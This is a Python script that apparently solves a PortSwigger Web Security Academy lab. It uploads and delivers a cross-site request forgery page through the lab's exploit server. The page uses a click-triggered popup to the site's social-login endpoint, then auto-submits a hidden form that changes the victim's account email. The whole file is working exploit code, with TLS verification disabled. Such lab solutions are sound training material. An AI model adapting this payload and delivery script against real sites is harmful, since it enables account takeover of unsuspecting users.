import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def submit_exploit_server(session, url, response_file, response_head, response_body, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": response_file,
        "responseHead": response_head,
        "responseBody": response_body,
        "formAction": form_action
    }
    resp = session.post(url, data=params, verify=False, allow_redirects=True)
    if resp.status_code not in (200, 302):
        raise ValueError(f"Exploit server request failed with status code {resp.status_code}")
    return True


def is_lab_solved(session, host):
    resp = session.get(host, verify=False)
    return "Congratulations, you solved the lab!" in resp.text


def main():
    host = "https://0ab30075043b978c80c5129800b400d0.web-security-academy.net"
    exploit_host = "https://exploit-0a5900b204f2978f800411e201180079.exploit-server.net"

    payload = f'''
<html>
<body>
<form method="POST" action="{host}/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {{
        window.open('{host}/social-login');
        setTimeout(changeEmail, 5000);
    }}

    function changeEmail() {{
        document.forms[0].submit();
    }}
</script>
</body>
</html>
'''

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    session = requests.Session()
    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "STORE")
    print("Exploit stored.")

    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "DELIVER_TO_VICTIM")
    print("Exploit delivered to victim.")

    time.sleep(10)
    if is_lab_solved(session, f"{host}/"):
        print("Koated !!!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()